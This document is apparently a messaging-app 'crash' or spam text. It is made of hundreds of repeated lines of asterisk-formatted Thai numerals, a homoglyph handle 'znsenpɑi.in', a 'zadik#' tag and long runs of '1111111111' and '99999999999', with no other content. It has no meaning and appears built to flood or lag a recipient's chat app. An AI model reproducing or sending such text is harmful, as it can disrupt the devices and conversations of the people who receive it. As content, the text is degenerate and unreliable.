*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
zadik#
*1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
